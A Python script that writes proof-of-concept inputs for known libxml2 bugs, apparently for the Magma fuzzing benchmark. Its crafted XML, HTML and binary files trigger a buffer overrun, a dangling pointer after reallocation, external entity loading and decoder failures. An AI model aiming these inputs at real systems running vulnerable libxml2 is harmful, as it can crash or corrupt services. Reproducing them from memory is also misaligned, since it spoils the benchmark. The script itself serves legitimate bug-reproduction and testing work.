#!/usr/bin/env python3
"""Write one PoC per magma libxml2 bug into argv[1].

File names are <harness>_<bug>[_variant].{xml,html,bin}. harness_0/1 inputs
end with 4 config bytes (see support/harness.h): mode, chunk size,
stop-after-N-errors and option flags.
"""
import os
import struct
import sys

out = sys.argv[1]

# harness_0 flag bits (index into xml_options[] in harness_0.c)
X_RECOVER, X_NOENT, X_DTDLOAD, X_DTDATTR, X_DTDVALID = 0, 1, 2, 3, 4
X_POST_VALIDATE, X_DUMP = 15, 16
# harness_1 flag bits
H_RECOVER, H_DUMP = 0, 7


def cfg(mode=0, chunk=1, stop=0, flags=()):
    raw = mode | ((chunk - 1) << 2) | (stop << 8)
    for f in flags:
        raw |= 1 << (12 + f)
    return struct.pack("<I", raw)


def w(name, data):
    with open(os.path.join(out, name), "wb") as f:
        f.write(data)


# ---- harness_0: XML ---------------------------------------------------------

# XML001 + XML006: prefixed name in a content model that (with the prefix)
# overruns the 5000-byte buffer in xmlSnprintfElementContent; <a/> is invalid.
P, N = 2000, 2997
model = b"p" * P + b":" + b"n" * N
w("h0_xml001_006.xml",
  b"<!DOCTYPE a [<!ELEMENT a (" + model + b")>]><a/>\n" +
  cfg(flags=[X_DTDVALID]))

# XML002: namespace declaration declared as an ID attribute.
w("h0_xml002.xml",
  b'<!DOCTYPE a [<!ATTLIST a xmlns:x ID #IMPLIED>]><a xmlns:x="u"/>\n' +
  cfg(flags=[X_DTDVALID]))

# XML003: external parameter entity reference, default options.
w("h0_xml003.xml",
  b'<!DOCTYPE a [<!ENTITY % e SYSTEM "e.ent"> %e;]><a/>\n' + cfg())

# XML004: .lzma (LZMA_alone) header with dict_size = UINT32_MAX passes
# xzlib's format sniffing, then exceeds the 100 MB decoder memlimit:
# lzma_code() returns LZMA_MEMLIMIT_ERROR, which only the fix rejects.
# Read through libxml2's own file I/O (mode 3).
lzma_alone = b"\x5d" + b"\xff" * 4 + b"\xff" * 8
w("h0_xml004.bin", lzma_alone + b"\x00" * 32 + cfg(mode=3))

# XML008: "--" inside a comment; the error handler stops on the 1st error.
w("h0_xml008.xml", b"<a><!-- x -- y --></a>\n" + cfg(stop=1))

# XML009: encoding switch whose conversion of buffered input fails.
# The undecodable byte directly follows the declaration's closing quote, so
# the first-line conversion fails before producing any output.
for enc in (b"EUC-JP", b"ISO-2022-JP"):
    w("h0_xml009_%s.xml" % enc.decode(),
      b'<?xml version="1.0" encoding="' + enc + b'"\xff\xfe?><a/>\n' + cfg())

# XML010: external PE referenced from an entity value (inside a PE, where
# PE references in entity values are allowed).
w("h0_xml010.xml",
  b'<!DOCTYPE a [<!ENTITY % e SYSTEM "e.ent">'
  b'<!ENTITY % w "<!ENTITY f \'&#37;e;\'>">%w;]><a/>\n' + cfg())

# XML012: xmlParseNCNameComplex caches `end`, then CUR_CHAR on a 2-byte
# non-name char (U+00D7) whose lead byte is the last buffered byte grows the
# input buffer; if that grow reallocates (moves) the buffer, `end` dangles.
# Pull input 1 byte per read (mode 1) with RECOVER (keeps SAX allocating, so
# realloc cannot extend in place). A ~4 KB name fills the 8 KiB buffer to
# the point where the grow at the U+00D7 is the reallocating one; the exact
# length depends on build/layout, so emit a small window around it.
for L in range(4018, 4036):
    doc = (b"<r>" + b"<x>t</x>" * 20 + b"<" + "é".encode() + b"a" * L +
           "×".encode() + b"/></r>\n")
    w("h0_xml012_L%d.xml" % L, doc + cfg(mode=1, chunk=1, flags=[X_RECOVER]))

# XML017: junk between the internal subset's "]" and ">".
w("h0_xml017.xml", b"<!DOCTYPE a [ ] x><a/>\n" + cfg())

# ---- harness_1: HTML --------------------------------------------------------

# XML007: push parser (mode 2), stopped by the error handler on the first
# error, then fed more chunks.
w("h1_xml007.html",
  b"<html><body><bogus>" + b"text " * 40 + b"</body></html>\n" +
  cfg(mode=2, chunk=8, stop=1, flags=[H_RECOVER]))

# XML013: DOCTYPE system literal read in `chunk`-byte pieces (mode 1), long
# enough that the input buffer is reallocated while it is being scanned.
for chunk, n in ((16, 5000), (64, 9000)):
    w("h1_xml013_c%d_%d.html" % (chunk, n),
      b'<!DOCTYPE html PUBLIC "-//x//y" "' + b"s" * n +
      b'"><html></html>\n' + cfg(mode=1, chunk=chunk))

# XML014: document ending in the middle of an entity reference name
# (htmlParseName). The trailing config bytes ("dpzz") are themselves name
# characters: 'd' -> mode 0, 'p' -> no stop.
w("h1_xml014.html", b"<html><body>x &adpzz")

# XML015: non-ASCII entity name (htmlParseNameComplex) hitting invalid UTF-8:
# the ISO-8859-1 fallback rebuilds the input buffer mid-name.
w("h1_xml015.html", b"<html><body>x &" + "éé".encode() + b"\xff\xfeb; y</body></html>\n" + cfg())

# ---- harness_2: regexp / string API ------------------------------------------

# XML016: range end before start. Opcode 0 = regexp.
w("h2_xml016.bin", b"\x00[z-a]\nq\n")

# XML005 + XML011 (reach): opcode 2 = buffer APIs, opcode 3 = xmlStrncat / xmlStrncatNew.
w("h2_xml005_011.bin", b"\x02\x10\x00abc\n\x03\x00\x05\x00\x00\x00abc\ndefgh\n\x03\x01\x02\x00\x00\x00x\nyz\n")
